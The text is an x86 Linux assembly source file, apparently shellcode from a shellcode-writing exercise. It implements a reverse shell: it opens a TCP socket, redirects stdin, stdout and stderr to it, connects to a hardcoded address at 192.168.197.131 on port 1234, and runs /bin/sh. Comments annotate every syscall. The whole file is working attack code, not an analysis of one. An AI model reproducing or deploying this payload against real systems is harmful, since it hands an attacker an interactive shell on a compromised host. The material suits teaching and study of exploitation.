global _start
section .text
_start:

xor eax,eax 		;clearing out eax
mov al,0x66		;create socket syscall
xor ebx,ebx		;clearing out ebx
inc ebx			;set ebx to 1
push 0			; for TCP
push 1			; for SOCK_STREAM
push 2			; for AF_INET
mov ecx, esp		; now ecx has a pointer to our 3 arguments
int 0x80		;initiate syscall!
mov edi, eax		;store the socket fd safely
xchg eax, ebx		;put the new socket FD in ebx

xor ecx, ecx		;starting with stdin
mov al, 0x3f		;syscall dup2
int 0x80		;init syscall

mov al, 0x3f		;dup2 syscall
inc ecx			;ecx = 1, stdout
int 0x80		;init syscall

mov al, 0x3f		;dup2 syscall
inc ecx			;ecx = 2, stderr
int 0x80		;init syscall


push  0x83c5a8c0 	;ip addr
push  0xd2040002	;port number + AF_INET
mov ecx,esp		;ecx now has the pointer to the struct
mov al, 0x66		;syscall 102, socketcall
mov bl, 0x3		; for connect()
push 16			;addrlen
push ecx		;struct addr
push edi		;the fd
mov ecx, esp		;pointer to the top of the stack

int 0x80		;connect!
push edx 		; null terminator
push dword 0x68732f6e 	;"hs/n"
push dword 0x69622f2f 	;"ib//"
mov ebx,esp		;ebx has now pointer to the filename
push edx 		;null terminator
push ebx		;push string pointer to stack
mov ecx,esp		;ecx has a pointer to a pointer that points to the string
mov al,0xb 		;exev syscall
int 0x80 		;initate syscall

